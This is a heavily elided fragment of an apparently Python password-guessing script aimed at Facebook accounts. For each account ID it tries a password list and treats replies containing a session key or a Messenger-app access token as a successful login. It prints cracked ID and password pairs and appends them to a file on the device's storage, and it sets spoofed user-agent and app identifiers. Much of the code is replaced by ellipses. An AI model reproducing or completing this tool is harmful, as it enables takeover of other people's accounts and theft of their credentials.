...
----------------------------------------------
 ...
 ok ids will be saved in RABBI folder
----------------------------------------------""")
def line():
	print(f'\033[1;37m------------------------------------------------')
	...
	try:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [RABBI-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/AKING/RABBI-M1-OK.txt','a').write(ids+'|'+pas+'\n')
	...
	try:
		...
		for pw in passlist:
			...
			if '350685531728' in accessToken:
				...
				fban = 'Orca-Android'
				fbpn = 'com.facebook.orca'
			ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36;]'.replace('\n','')
